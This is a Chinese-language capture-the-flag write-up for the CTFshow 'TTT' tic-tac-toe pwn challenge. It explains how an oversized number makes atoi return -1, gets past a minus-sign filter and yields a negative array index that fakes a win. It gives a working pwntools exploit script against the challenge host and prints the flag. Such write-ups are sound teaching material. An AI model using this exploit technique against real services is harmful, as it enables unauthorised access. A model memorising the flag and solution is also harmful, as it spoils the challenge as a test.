# CTFshow TTT WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28229`
- 附件：`challenges/ttt.c`
- 类型：整数溢出、数组越界、游戏逻辑绕过
- Flag：`ctfshow{26bf2f56-647e-42e9-b7c0-fa2e6055d1ca}`

## 源码分析

棋盘结构如下：

```c
struct Board {
    char grid[3][3];
    int moves_left;
} board;
```

玩家落子的代码：

```c
int you_move() {
    int r, c;
    while (1) {
        printf("row");
        r = readint();
        printf("col");
        c = readint();
        if (!board.grid[c][r]) break;
    }
    board.moves_left--;
    board.grid[c][r] = YOU;
    return (
        check_line(c, r, 0, 1, YOU) ||
        check_line(c, r, 1, 0, YOU) ||
        check_line(c, r, 1, 1, YOU) ||
        check_line(c, r, 1, -1, YOU)
    );
}
```

正常情况下，`r` 和 `c` 应该只能是 `0、1、2`。但程序没有显式检查范围，只是在访问数组时直接使用：

```c
board.grid[c][r]
```

因此可以通过整数溢出构造负数下标。

## 整数溢出

输入函数：

```c
int readint() {
    while (1) {
        printf("> ");
        unsigned long len = 0;
        char* line = NULL;
        getline(&line, &len, stdin);
        if (strchr(line, '-')) {
            free(line);
            continue;
        }
        int res = atoi(line);
        if (res < 3) {
            free(line);
            return res;
        }
        free(line);
    }
}
```

程序试图通过搜索字符 `-` 来禁止负数：

```c
if (strchr(line, '-')) continue;
```

但 `atoi` 会把超出 32 位有符号整数范围的数字转换为负数。发送：

```text
4294967295
```

在目标环境中会得到：

```c
atoi("4294967295") == -1
```

由于原始输入没有 `-` 字符，所以成功绕过过滤，并把 `-1` 传给后续棋盘逻辑。

## 构造获胜条件

我们先正常落子两次：

```text
row = 0, col = 0
row = 0, col = 1
```

此时玩家在同一行拥有两个棋子：

```text
board[0][0] = YOU
board[1][0] = YOU
```

第三次输入：

```text
row = 0
col = -1
```

实际发送的列值为：

```text
4294967295
```

此时 `you_move()` 执行：

```c
board.grid[-1][0] = YOU;
check_line(-1, 0, 1, 0, YOU);
```

分析 `check_line`：

```c
check_line(x, y, dx, dy, player) {
    return (
        get_point(x + dx, y + dy, player) +
        get_point(x + 2*dx, y + 2*dy, player) +
        get_point(x - dx, y - dy, player) +
        get_point(x - 2*dx, y - 2*dy, player)
    ) >= 2;
}
```

代入 `x=-1,y=0,dx=1,dy=0`：

```text
get_point(0, 0, YOU)  -> board[0][0] == YOU
get_point(1, 0, YOU)  -> board[1][0] == YOU
get_point(-2,0, YOU)  -> 越界，返回 0
get_point(-3,0, YOU)  -> 越界，返回 0
```

前两个检查结果为 1，总和达到 2，于是 `you_move()` 返回真值：

```c
if (you_move()) {
    print_board();
    get_flag();
    return 0;
}
```

最终调用 `get_flag()` 读取并输出 `flag.txt`。

## 完整 Exploit

文件：`exploits/ttt.py`

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "info"
io = remote("pwn.challenge.ctf.show", 28229)

io.recvuntil(b"Press [ENTER] to start the game!")
io.sendline(b"")

def move(row, col):
    io.sendlineafter(b"row", str(row).encode())
    io.sendlineafter(b"col", str(col).encode())

move(0, 0)
move(0, 1)

# 4294967295 -> atoi() == -1，绕过 '-' 过滤
move(0, 4294967295)

io.interactive()
```

运行：

```bash
python3 exploits/ttt.py
```

输出：

```text
ctfshow{26bf2f56-647e-42e9-b7c0-fa2e6055d1ca}
```

## 总结

本题不需要破解 minimax，也不需要真正战胜 CPU。漏洞链为：

```text
超大正数输入
    |
    v
atoi 溢出为 -1
    |
    v
绕过负号过滤
    |
    v
数组负下标访问
    |
    v
利用 check_line 的相邻坐标检查伪造胜利
    |
    v
调用 get_flag()
```
